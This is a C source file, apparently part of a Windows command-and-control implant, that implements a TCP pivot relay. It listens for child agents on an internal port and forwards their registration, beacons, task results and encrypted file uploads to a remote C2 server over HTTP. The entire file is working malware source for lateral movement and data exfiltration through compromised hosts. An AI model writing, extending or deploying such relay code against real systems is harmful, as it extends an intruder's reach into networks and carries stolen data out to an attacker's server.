/* tcp_pivot.c — TCP pivot relay server for the C agent.
 * Child agents connect with 4-byte LE length-prefix JSON framing.
 * Relay: register/beacon/result/upload → real C2 via agent_http_do.
 */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "api_resolve.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tcp_pivot.h"
#include "transport.h"
#include "b64.h"
#include "crypto.h"

static volatile SOCKET g_tp_sock = INVALID_SOCKET;
static volatile int    g_tp_stop = 1;
static HANDLE          g_tp_thr  = NULL;
static char            g_tp_agid[64] = {0};

/* ── Frame I/O ─────────────────────────────────────────────────────────────── */

static int recv_exact(SOCKET s, void *buf, int n) {
    int got = 0;
    while (got < n) { int r = recv(s, (char*)buf+got, n-got, 0); if (r<=0) return 0; got+=r; }
    return 1;
}

static char *tp_read_frame(SOCKET s, size_t *out_len) {
    uint8_t lb[4]; if (!recv_exact(s, lb, 4)) return NULL;
    uint32_t flen; memcpy(&flen, lb, 4);
    if (flen > 4*1024*1024) return NULL;
    char *buf = (char*)malloc(flen+1); if (!buf) return NULL;
    if (!recv_exact(s, buf, (int)flen)) { free(buf); return NULL; }
    buf[flen] = '\0'; *out_len = flen; return buf;
}

static int tp_write_frame(SOCKET s, const char *data, size_t dlen) {
    uint32_t n32 = (uint32_t)dlen;
    if (send(s, (const char*)&n32, 4, 0) != 4) return 0;
    if (dlen > 0 && send(s, data, (int)dlen, 0) != (int)dlen) return 0;
    return 1;
}

/* ── Simple JSON helpers ────────────────────────────────────────────────────── */

static const char *json_str_field(const char *json, const char *key, char *out, size_t outsz) {
    char needle[128]; snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle); if (!p) return NULL;
    p += strlen(needle); while (*p == ':' || *p == ' ') p++;
    if (*p != '"') return NULL; p++;
    size_t i = 0;
    while (*p && *p != '"' && i < outsz-1) out[i++] = *p++;
    out[i] = '\0'; return out;
}

static int json_int_field(const char *json, const char *key, int def) {
    char needle[128]; snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle); if (!p) return def;
    p += strlen(needle); while (*p == ':' || *p == ' ') p++;
    return atoi(p);
}

typedef struct { SOCKET client; } TpClientParam;

static DWORD WINAPI tp_client_proc(LPVOID p) {
    TpClientParam *cp = (TpClientParam*)p; SOCKET cs = cp->client; free(cp);
    size_t flen; char *frm = tp_read_frame(cs, &flen);
    if (!frm) { closesocket(cs); return 1; }
    /* expect register */
    if (!strstr(frm, "\"register\"")) { free(frm); closesocket(cs); return 1; }
    /* extract fields from payload */
    char hostname[128]="", username[64]="", proc[128]="", lang[32]="nim";
    const char *pp = strstr(frm, "\"p\""); if (pp) pp = strchr(pp+3, '{');
    if (pp) {
        json_str_field(pp, "hostname",     hostname, sizeof(hostname));
        json_str_field(pp, "username",     username, sizeof(username));
        json_str_field(pp, "process_name", proc,     sizeof(proc));
        json_str_field(pp, "language",     lang,     sizeof(lang));
    }
    free(frm);
    /* build register body */
    char reg_body[1024];
    int is_admin = 0;
    snprintf(reg_body, sizeof(reg_body),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows\","
        "\"pid\":0,\"transport\":\"tcp\",\"sleep_sec\":60,\"jitter_pct\":20,"
        "\"process_name\":\"%s\",\"is_admin\":false,\"language\":\"%s\","
        "\"parent_id\":\"%s\"}",
        hostname, username, proc, lang, g_tp_agid);
    char extra[128]; snprintf(extra, sizeof(extra), "X-C2-Parent: %s\r\n", g_tp_agid);
    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    if (!agent_http_do("POST", "/register", (const uint8_t*)reg_body, strlen(reg_body),
                       extra, &resp, &resp_len, &status) || status != 200 || !resp) {
        if (resp) free(resp);
        closesocket(cs); return 1;
    }
    /* null-terminate; resp_len doesn't count the terminator */
    uint8_t *resp_z = (uint8_t*)realloc(resp, resp_len + 1);
    if (!resp_z) { free(resp); closesocket(cs); return 1; }
    resp = resp_z; resp[resp_len] = '\0';
    char agent_id[64]="", aes_b64[256]="";
    json_str_field((char*)resp, "agent_id", agent_id, sizeof(agent_id));
    json_str_field((char*)resp, "aes_key",  aes_b64,  sizeof(aes_b64));
    if (!agent_id[0] || !aes_b64[0]) { free(resp); closesocket(cs); return 1; }
    /* decode AES key */
    unsigned char aes_key[32] = {0};
    size_t key_len = 0;
    uint8_t *key_dec = b64_decode(aes_b64, &key_len);
    if (!key_dec || key_len != 32) { if (key_dec) free(key_dec); free(resp); closesocket(cs); return 1; }
    memcpy(aes_key, key_dec, 32); free(key_dec);
    /* send register_resp to child using the same resp buffer */
    char *rr2_s = (char*)malloc(resp_len + 64);
    if (!rr2_s) { free(resp); closesocket(cs); return 1; }
    snprintf(rr2_s, resp_len+64, "{\"t\":\"register_resp\",\"p\":%.*s}", (int)resp_len, (char*)resp);
    free(resp);
    tp_write_frame(cs, rr2_s, strlen(rr2_s)); free(rr2_s);
    /* message loop */
    while (!g_tp_stop) {
        size_t mlen; char *msg = tp_read_frame(cs, &mlen); if (!msg) break;
        if (strstr(msg, "\"beacon\"")) {
            char beacon_path[128]; snprintf(beacon_path, sizeof(beacon_path), "/beacon/%s", agent_id);
            uint8_t *bd = NULL; size_t bd_len = 0; int bs = 0;
            agent_http_do("GET", beacon_path, NULL, 0, extra, &bd, &bd_len, &bs);
            if (bs == 204 || !bd || !bd_len) {
                if (bd) free(bd);
                /* synthesize encrypted empty tasks */
                const char *empty = "{\"tasks\":[]}";
                size_t enc_len = 0;
                uint8_t *enc = aes_gcm_seal(aes_key, 32, (const uint8_t*)empty, strlen(empty), &enc_len);
                if (enc) {
                    char *enc_b64 = b64_encode(enc, enc_len); free(enc);
                    char rsp[512]; snprintf(rsp, sizeof(rsp), "{\"t\":\"tasks\",\"p\":\"%s\"}", enc_b64 ? enc_b64 : "");
                    if (enc_b64) free(enc_b64);
                    tp_write_frame(cs, rsp, strlen(rsp));
                }
            } else {
                char *enc_b64 = b64_encode(bd, bd_len); free(bd);
                size_t rsp_sz = (enc_b64 ? strlen(enc_b64) : 0) + 32;
                char *rsp = (char*)malloc(rsp_sz);
                if (rsp) { snprintf(rsp, rsp_sz, "{\"t\":\"tasks\",\"p\":\"%s\"}", enc_b64 ? enc_b64 : ""); tp_write_frame(cs, rsp, strlen(rsp)); free(rsp); }
                if (enc_b64) free(enc_b64);
            }
        } else if (strstr(msg, "\"result\"")) {
            /* extract base64 payload, forward to C2 */
            char enc_b64[65536]="";
            json_str_field(msg, "p", enc_b64, sizeof(enc_b64));
            size_t enc_len = 0;
            uint8_t *enc_bytes = b64_decode(enc_b64, &enc_len);
            if (enc_bytes && enc_len > 0) {
                char result_path[128]; snprintf(result_path, sizeof(result_path), "/result/%s", agent_id);
                uint8_t *rr = NULL; size_t rl = 0; int rs = 0;
                agent_http_do("POST", result_path, (const uint8_t*)enc_bytes, enc_len, extra, &rr, &rl, &rs);
                if (rr) free(rr); free(enc_bytes);
            }
            const char *ack = "{\"t\":\"ack\"}";
            tp_write_frame(cs, ack, strlen(ack));
        } else if (strstr(msg, "\"upload\"")) {
            char enc_b64[65536]="";
            json_str_field(msg, "p", enc_b64, sizeof(enc_b64));
            size_t enc_len = 0;
            uint8_t *enc_bytes = b64_decode(enc_b64, &enc_len);
            if (enc_bytes && enc_len > 0) {
                size_t plain_len = 0;
                uint8_t *plain = aes_gcm_open(aes_key, 32, (const uint8_t*)enc_bytes, enc_len, &plain_len);
                free(enc_bytes);
                if (plain) {
                    plain[plain_len] = '\0';
                    int task_id = json_int_field((char*)plain, "task_id", 0);
                    char fname[256]="file"; json_str_field((char*)plain, "filename", fname, sizeof(fname));
                    char fdata_b64[65536]=""; json_str_field((char*)plain, "data", fdata_b64, sizeof(fdata_b64));
                    size_t fdata_len = 0;
                    uint8_t *fdata = b64_decode(fdata_b64, &fdata_len);
                    char upload_path[256]; snprintf(upload_path, sizeof(upload_path), "/upload/%s?task_id=%d&filename=%s", agent_id, task_id, fname);
                    if (fdata && fdata_len > 0) {
                        uint8_t *ur = NULL; size_t ul = 0; int us = 0;
                        agent_http_do("POST", upload_path, (const uint8_t*)fdata, fdata_len, extra, &ur, &ul, &us);
                        if (ur) free(ur); free(fdata);
                    }
                    free(plain);
                }
            } else if (enc_bytes) free(enc_bytes);
            const char *ack = "{\"t\":\"ack\"}";
            tp_write_frame(cs, ack, strlen(ack));
        }
        free(msg);
    }
    closesocket(cs); return 0;
}

static DWORD WINAPI tp_server_proc(LPVOID p) {
    int port = (int)(intptr_t)p;
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ls == INVALID_SOCKET) return 1;
    g_tp_sock = ls;
    BOOL reuse = TRUE; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, (const char*)&reuse, sizeof(reuse));
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET; sa.sin_port = htons((uint16_t)port); sa.sin_addr.s_addr = INADDR_ANY;
    if (bind(ls, (struct sockaddr*)&sa, sizeof(sa)) != 0 || listen(ls, 16) != 0) {
        closesocket(ls); g_tp_sock = INVALID_SOCKET; return 1;
    }
    while (!g_tp_stop) {
        struct sockaddr_in ca; int cal = sizeof(ca);
        SOCKET cs = accept(ls, (struct sockaddr*)&ca, &cal);
        if (cs == INVALID_SOCKET) break;
        TpClientParam *cp = (TpClientParam*)malloc(sizeof(TpClientParam)); cp->client = cs;
        HANDLE h = CreateThread(NULL, 0, tp_client_proc, cp, 0, NULL);
        if (h) CloseHandle(h); else { free(cp); closesocket(cs); }
    }
    closesocket(ls); g_tp_sock = INVALID_SOCKET; return 0;
}

char *tcp_pivot_start(int port, const char *agent_id) {
    if (!g_tp_stop) return _strdup("[-] TCP pivot already running");
    strncpy(g_tp_agid, agent_id ? agent_id : "", sizeof(g_tp_agid)-1);
    g_tp_stop = 0;
    g_tp_thr = CreateThread(NULL, 0, tp_server_proc, (LPVOID)(intptr_t)port, 0, NULL);
    if (!g_tp_thr) { g_tp_stop = 1; return _strdup("[-] TCP pivot: CreateThread failed"); }
    char *out = (char*)malloc(128); snprintf(out, 128, "[+] TCP pivot started on port %d", port); return out;
}

void tcp_pivot_stop(void) {
    g_tp_stop = 1;
    if (g_tp_sock != INVALID_SOCKET) closesocket((SOCKET)g_tp_sock);
    if (g_tp_thr) { WaitForSingleObject(g_tp_thr, 3000); CloseHandle(g_tp_thr); g_tp_thr = NULL; }
}
